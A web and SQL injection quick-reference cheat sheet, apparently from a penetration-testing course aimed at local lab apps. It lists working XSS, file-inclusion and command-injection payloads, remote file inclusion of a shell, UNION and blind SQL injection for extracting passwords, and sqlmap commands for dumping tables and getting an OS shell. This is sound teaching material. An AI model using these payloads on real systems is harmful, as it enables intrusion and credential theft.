# Web & SQL Injection

Quick reference for web-app testing. Pairs with [Module 14](../modules/14-hacking-web-applications/README.md) and [Module 15](../modules/15-sql-injection/README.md). Targets = the Docker web apps (`localhost:8081–8084`) or **authorized** sites only.

> Proxy the browser through **Burp** (`127.0.0.1:8080`, install its CA) — prove a finding by hand in **Repeater**, then automate.

## Discovery & fingerprinting
```bash
whatweb http://localhost:8081                       # tech stack
ffuf -u http://localhost:8081/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt
ffuf -u http://localhost:8081/FUZZ -w list.txt -e .php,.txt -mc 200,301,302
gobuster dir -u http://localhost:8081 -w /usr/share/wordlists/dirb/common.txt -x php,txt
nikto -h http://localhost:8081                      # server misconfig/CVEs
```

## Cross-site scripting (XSS) test payloads
```
<script>alert(document.domain)</script>
"><img src=x onerror=alert(1)>              # attribute breakout
javascript:alert(1)                         # href / DOM sink
'"><svg/onload=alert(1)>
```
Fix = **context-aware output encoding + CSP** (not just input filtering).

## LFI / traversal / RFI
```
?page=../../../../etc/passwd
?page=....//....//etc/passwd                # filter bypass
?page=php://filter/convert.base64-encode/resource=index.php   # read source
?page=http://192.168.56.10/shell.txt        # RFI (needs allow_url_include)
```

## Command injection
```
; id            | id            && whoami           `id`           $(id)
127.0.0.1; cat /etc/passwd
```

## SQL injection — manual
```sql
-- Detect
1'                       1"          1' OR '1'='1' -- -
-- Column count, then find visible columns
1' ORDER BY 3 -- -
1' UNION SELECT 1,2,3 -- -
-- Fingerprint + current context (MySQL)
1' UNION SELECT version(),database() -- -
-- Enumerate schema
1' UNION SELECT table_name,table_schema FROM information_schema.tables -- -
1' UNION SELECT column_name,2 FROM information_schema.columns WHERE table_name='users' -- -
-- Extract
1' UNION SELECT user,password FROM users -- -
-- Blind (boolean / time)
1' AND SUBSTRING(version(),1,1)='5' -- -
1' AND IF(SUBSTRING(database(),1,1)='d',SLEEP(5),0) -- -
-- Read/write files (MySQL, privileged)
1' UNION SELECT LOAD_FILE('/etc/passwd'),2 -- -
... INTO OUTFILE '/var/www/html/sh.php'
```
DB fingerprint by delay function: MySQL `SLEEP()` · MSSQL `WAITFOR DELAY '0:0:5'` · PostgreSQL `pg_sleep()` · Oracle differs (`all_tables`). MSSQL RCE: `xp_cmdshell`.

## sqlmap
```bash
sqlmap -u "http://localhost:8081/vulnerabilities/sqli/?id=1&Submit=Submit" \
       --cookie="PHPSESSID=<yours>; security=low" --batch --dbs
sqlmap ... --batch -D dvwa -T users --dump           # dump a table
sqlmap ... --batch -D dvwa -T users -C user,password --dump   # specific columns
sqlmap ... --batch --current-user --is-dba --privileges       # privilege check
sqlmap ... --batch --os-shell                        # attempt an OS shell
sqlmap -r request.txt --batch                        # from a saved Burp request
sqlmap ... --level 3 --risk 2 --tamper=space2comment # widen tests / WAF evasion
```

## Other quick tests
- **IDOR:** change `?id=1001` → `1002`; access another user's object (broken access control, A01).
- **CSRF:** missing anti-CSRF token + no SameSite → forge a state-changing request.
- **SSRF:** app fetches a URL you control → reach internal / `169.254.169.254`.
- **File upload → shell:** upload `shell.php`, bypass type checks (double ext, magic bytes, `Content-Type`), then browse to it.

> Deep: PortSwigger Academy — https://portswigger.net/web-security · PayloadsAllTheThings — https://github.com/swisskyrepo/PayloadsAllTheThings · OWASP WSTG — https://owasp.org/www-project-web-security-testing-guide/
